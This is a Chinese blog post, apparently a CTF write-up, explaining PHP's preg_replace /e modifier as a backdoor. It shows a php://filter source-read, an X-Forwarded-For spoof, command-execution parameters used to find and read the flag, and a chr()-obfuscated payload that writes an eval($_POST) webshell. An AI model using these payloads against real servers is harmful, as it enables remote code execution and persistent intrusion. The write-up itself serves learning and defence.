@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="php," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="php中正则替换所有符合条件的字符串 最近又在看正则 刚好记录下">
+<meta name="keywords" content="php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="preg_replace后门">
+<meta property="og:url" content="http://Merl1ng.com/2018/01/20/preg_replace后门/index.html">
+<meta property="og:site_name" content="Merl1ng's blog">
+<meta property="og:description" content="php中正则替换所有符合条件的字符串 最近又在看正则 刚好记录下">
+<meta property="og:updated_time" content="2018-01-24T14:46:41.170Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="preg_replace后门">
+<meta name="twitter:description" content="php中正则替换所有符合条件的字符串 最近又在看正则 刚好记录下">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://Merl1ng.com/2018/01/20/preg_replace后门/"/>
+
+
+
+
+
+  <title>preg_replace后门 | Merl1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Merl1ng's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/01/20/preg_replace后门/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Merl1ng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Merl1ng's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">preg_replace后门</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-20T22:31:32+08:00">
+                2018-01-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>php中正则替换所有符合条件的字符串 最近又在看正则 刚好记录下</p>
+<a id="more"></a>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>题目是XCTF的一道新题</p>
+<p>题目连接 <a href="http://47.104.74.209:20005/index.php?page=index" target="_blank" rel="external">http://47.104.74.209:20005/index.php?page=index</a></p>
+<p>首先想到文件包含 <a href="http://47.104.74.209:20005/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="external">http://47.104.74.209:20005/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</a> </p>
+<p>读到源码 其中第121行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;?php</div><div class="line">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</div><div class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</div><div class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</div><div class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</div><div class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</div><div class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        die();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>发现是 preg_replace 后门</p>
+<h3 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h3><p>先了解一下这个函数 preg_replace（）是 php里面的正则函数 用来正则替换所有符合条件的字符串</p>
+<p>最近在学python爬虫时学习了点正则表达式 改脚本时遇到了个replace函数 如xxx.replace(‘?’,’’)会把指定文本中的?替</p>
+<p>换为空 但是这个好像不是正则表达式 只是单纯的替换 python中类似的还有参考<br><a href="http://blog.csdn.net/zcmlimi/article/details/47709049" target="_blank" rel="external">http://blog.csdn.net/zcmlimi/article/details/47709049</a></p>
+<p>回到php的preg_replace函数中来</p>
+<p>PHP preg_replace() 正则替换，与Javascript 正则替换不同，PHP preg_replace() 默认就是替换所有符号匹配条件的元素</p>
+<p>preg_replace函数原型</p>
+<p>Preg_replace(mixed $pattern, mixed $replacement, mixed $subject [,int $limit = -1 [,int $count ]]) </p>
+<p>有五个参数,有三个是必须参数</p>
+<p>$pattern 可以是字符串,字符串数组,或者preg</p>
+<p>$replace 是用于替换的字符串或字符串数组</p>
+<p>$subject 目标字符串或者目标字符串数组</p>
+<p>$limit 每个模式在每个$subject上最大的替换次数,默认是-1(无限次)</p>
+<p>$count 返回在目标字符串所替换的次数</p>
+<p>大概表示在 subject 中搜索 pattern 模式的匹配项并替换为 replacement 默认替换所有符号匹配条件的元素</p>
+<p>举个例子 如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$string</span>=<span class="string">'[b]粗体字[/b]'</span>;</div><div class="line"><span class="variable">$b_rst</span>=preg_replace(<span class="string">'/\[b\](.*)\[\/b\&#125;/i'</span>,<span class="string">'&lt;b&gt;$1&lt;/b&gt;'</span>,<span class="variable">$string</span>);</div><div class="line"><span class="built_in">echo</span> <span class="variable">$b_rst</span>;</div></pre></td></tr></table></figure>
+<p>/i 表示不区分大小写 </p>
+<p>第二个参数中的（$n）：匹配的是第一个参数中的第n个括号中的内容 </p>
+<p><code>(.*)</code>表示匹配任意一个长度大于等于0的字符串,这里匹配,[b]之间的汉字. 点表示任意字符,*表示字符长度大于等于0</p>
+<p>用()括起来表示匹配到的字符串可以作为一个变量被其他表达式使用,第一个()里面的内容就是变量1,被其他表达式引用的时候用$1代表</p>
+<p>如果正则表达式里面有第二个(),那么第二个()匹配到的内容就可以用$2被其他表达式引用,以此类推</p>
+<p>[和/和]是正则表达式内部要用到的符号,所以在匹配[和]的时候要用[和\/和]来转义  所以[b]就匹配[b]</p>
+<p>所以’/[b](.*)[\/b}/i’,’<b>$1</b>‘就是把[b]粗体字[/b]替换成<b>粗体字</b></p>
+<p>其他的一些可以参考<br><a href="https://www.cnblogs.com/chenshishuo/p/4912456.html" target="_blank" rel="external">https://www.cnblogs.com/chenshishuo/p/4912456.html</a><br><a href="http://www.jb51.net/article/46458.htm" target="_blank" rel="external">http://www.jb51.net/article/46458.htm</a></p>
+<h3 id="preg-replace危险的-e修饰符-一句话后门常用"><a href="#preg-replace危险的-e修饰符-一句话后门常用" class="headerlink" title="preg_replace危险的/e修饰符(一句话后门常用)"></a>preg_replace危险的/e修饰符(一句话后门常用)</h3><p>先看下 PHP 正则表达式修饰符</p>
+<p>修饰符被放在PHP正则表达式定界符“/”尾部，在正则表达式尾部引号之前。</p>
+<p>i 忽略大小写，匹配不考虑大小写<br>m 多行独立匹配，如果字符串不包含[\n]等换行符就和普通正则一样。<br>s 设置正则符号 . 可以匹配换行符[\n]，如果没有设置，正则符号.不能匹配换行符\n。<br>x 忽略没有转义的空格<br><strong>e eval() 对匹配后的元素执行函数。</strong><br>A 前置锚定，约束匹配仅从目标字符串开始搜索<br>D 锁定$作为结尾，如果没有D，如果字符串包含[\n]等换行符，$依旧依旧匹配换行符。如果设置了修饰符m，修饰符D 就会被忽略。<br>S 对非锚定的匹配进行分析<br>U 非贪婪，如果在正则字符量词后加“?”，就可以恢复贪婪<br>X 打开与perl 不兼容附件<br>u 强制字符串为UTF-8编码，一般在非UTF-8编码的文档中才需要这个</p>
+<p>我们知道eval函数在php内经常被用来执行一句话木马 被认为是十分不安全的 如<code>&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</code></p>
+<p>即 /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后） </p>
+<p>提示:要确保replacement 构成一个合法的 PHP 代码字符串,否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误</p>
+<p>如我们构造</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;? </div><div class="line"><span class="built_in">echo</span> preg_replace(<span class="string">"/test/e"</span>,<span class="variable">$_GET</span>[<span class="string">"h"</span>],<span class="string">"jutst test"</span>); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）</p>
+<p>如果提交的是?h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39)</p>
+<p>.chr(100).chr(97).chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39)</p>
+<p>.chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36)</p>
+<p>.chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59)) </p>
+<p>对应的明文是：?h=fputs(fopen(data/a.php,w),&lt;?php eval($_POST[cmd])?&gt;); </p>
+<p>执行的结果是在/data/目录下生成一个一句话木马文件 a.php。 </p>
+<p>(Chr，返回以数值表达式值为编码的字符 (ASCII码))</p>
+<p>还有更加有难度的例子参考<br><a href="http://www.jb51.net/article/38714.htm" target="_blank" rel="external">http://www.jb51.net/article/38714.htm</a></p>
+<h3 id="题目利用"><a href="#题目利用" class="headerlink" title="题目利用"></a>题目利用</h3><p>调用方法：</p>
+<p>preg_replace(“/test/e”,phpinfo(),”jutst test”);</p>
+<p>所以下面构造payload，需要注意的是</p>
+<p>$_SERVER[‘HTTP_X_FORWARDED_FOR’] === ‘127.0.0.1’</p>
+<p>我们需要改xff为127.0.0.1才能触发后门</p>
+<p>pat=/test/e&amp;rep=phpinfo()&amp;sub=jutst%20test (rep=system(‘ls’)也可以)</p>
+<p>发现一个可疑文件夹s3chahahaDir</p>
+<p>通过改变参数执行命令 </p>
+<p>rep=system(‘ls+s3chahahaDir’) 发现flag文件夹 好像 cd s3chahahaDir &amp;&amp; ls 也可以</p>
+<p>rep=system(‘ls+s3chahahaDir/flag’) 继续发现flag.php </p>
+<p>最后 rep=system(‘cat+s3chahahaDir/flag/flag.php’) 读到flag</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/25/base64-webshell/" rel="prev" title="base64-webshell">
+                base64-webshell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Merl1ng" />
+          <p class="site-author-name" itemprop="name">Merl1ng</p>
+           
+              <p class="site-description motion-element" itemprop="description">Love life , love gakki !</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Merl1ng" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/Merl1ng" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace函数"><span class="nav-number">2.</span> <span class="nav-text">preg_replace函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace危险的-e修饰符-一句话后门常用"><span class="nav-number">3.</span> <span class="nav-text">preg_replace危险的/e修饰符(一句话后门常用)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目利用"><span class="nav-number">4.</span> <span class="nav-text">题目利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Merl1ng</span>
+</div>
+
+
+<div class="powered-by">
+   Love life 
+</div>
+
+<div class="theme-info">
+  Love gakki 
+  
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
